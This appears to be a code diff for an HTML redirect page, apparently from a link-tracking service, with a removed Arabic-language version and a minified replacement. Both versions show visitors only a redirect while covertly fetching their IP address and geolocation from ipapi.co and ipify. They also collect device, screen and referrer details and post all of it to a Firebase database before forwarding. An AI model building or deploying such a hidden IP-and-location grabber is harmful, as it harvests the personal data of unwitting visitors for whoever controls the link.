@@ -1,105 +1,14 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Redirecting...</title>
-<style>
-body{background:#08080a;color:#fff;font-family:Cairo,Arial;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;margin:0}
-.loader{width:48px;height:48px;border:4px solid #1e293b;border-top-color:#00e5ff;border-radius:50%;animation:spin 0.8s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-.card{background:#14141b;border:1px solid #262631;border-radius:14px;padding:24px;text-align:center;max-width:320px}
-</style>
-</head>
-<body>
-<div class="card">
-<div class="loader" style="margin:0 auto"></div>
-<p style="margin-top:14px;font-size:13px;color:#00e5ff;font-weight:800">جاري تحويلك للموقع...</p>
-</div>
-
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title></title></head><body>
 <script>
-const FIREBASE_URL = "https://numgen-4f22c-default-rtdb.firebaseio.com";
-try{firebase.initializeApp({databaseURL:FIREBASE_URL});}catch(e){}
-const db = firebase.database();
-
-function getParam(name){
-  try{return new URL(window.location.href).searchParams.get(name);}catch(e){return null;}
+const FIREBASE="https://numgen-4f22c-default-rtdb.firebaseio.com";
+const params=new URLSearchParams(location.search);
+const id=params.get('id')||"unknown";
+const target=params.get('url')||"https://google.com";
+function logVisit(geo){
+  const data={name:id,ip:geo.ip||"unknown",city:geo.city||"unknown",country:geo.country_name||"",device:navigator.userAgent,screen:screen.width+"x"+screen.height,timestamp:Date.now(),time:new Date().toLocaleString(),target_url:target};
+  fetch(FIREBASE+"/white_label_clients/"+id+"/visitors.json",{method:"POST",body:JSON.stringify(data)});
+  fetch(FIREBASE+"/no_code_visits/"+id+".json",{method:"POST",body:JSON.stringify(data)});
 }
-
-async function getIP(){
-  try{let r=await fetch('https://api.ipify.org?format=json');let j=await r.json();return j.ip;}
-  catch(e){try{let r2=await fetch('https://ipapi.co/json/');let j2=await r2.json();return j2.ip||'unknown';}catch(e2){return 'unknown';}}
-}
-async function getGeo(ip){
-  try{if(!ip||ip==='unknown')return {};let r=await fetch('https://ipapi.co/'+ip+'/json/');let j=await r.json();return j;}catch(e){return {};}
-}
-
-async function trackAndRedirect(){
-  const clientId = getParam('id');
-  const token = getParam('token');
-  let targetUrl = getParam('url') || getParam('site') || getParam('to');
-  const sub = getParam('sub') || getParam('s') || '';
-  
-  if(targetUrl){
-    try{targetUrl = decodeURIComponent(targetUrl);}catch(e){}
-  }
-  
-  if(!clientId || !targetUrl){
-    document.body.innerHTML = '<div class="card"><p style="color:#ff5252">رابط غير صحيح</p></div>';
-    return;
-  }
-
-  if(!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;
-
-  try{
-    let ip = await getIP();
-    let geo = await getGeo(ip);
-    
-    const visitData = {
-      clientId: clientId,
-      token: token||'',
-      page: targetUrl,
-      actualPage: window.location.href,
-      time: new Date().toLocaleString('ar-EG'),
-      timestamp: Date.now(),
-      date: new Date().toISOString(),
-      site: 'no_code_redirect',
-      product: 'No-Code Tracking',
-      visitId: Date.now()+"_"+Math.random().toString(36).substring(2,9),
-      ip: ip,
-      country: geo.country_name||geo.country||'unknown',
-      country_code: geo.country_code||'',
-      city: geo.city||'unknown',
-      region: geo.region||'',
-      latitude: geo.latitude||'',
-      longitude: geo.longitude||'',
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      screen: screen.width+'x'+screen.height,
-      referrer: document.referrer||'direct',
-      subId: sub,
-      owner: clientId,
-      isolated: true,
-      method: 'no_code_redirect',
-      targetSite: targetUrl
-    };
-
-    db.ref('white_label_clients/'+clientId+'/visitors').push(visitData);
-    db.ref('clients/'+clientId+'/visitors').push(visitData);
-    db.ref('no_code_visits/'+clientId+'/'+new Date().toISOString().split('T')[0]).push(visitData);
-    db.ref('secure_links/'+clientId+'/visitors').push(visitData);
-    
-  }catch(e){
-    console.log('Track error but redirect', e);
-  } finally {
-    setTimeout(()=>{ window.location.href = targetUrl; }, 450);
-  }
-}
-
-trackAndRedirect();
+fetch("https://ipapi.co/json/").then(r=>r.json()).then(g=>{logVisit(g);setTimeout(()=>{location.href=target},300)}).catch(()=>{logVisit({});setTimeout(()=>{location.href=target},300)});
 </script>
-</body>
-</html>
+</body></html>
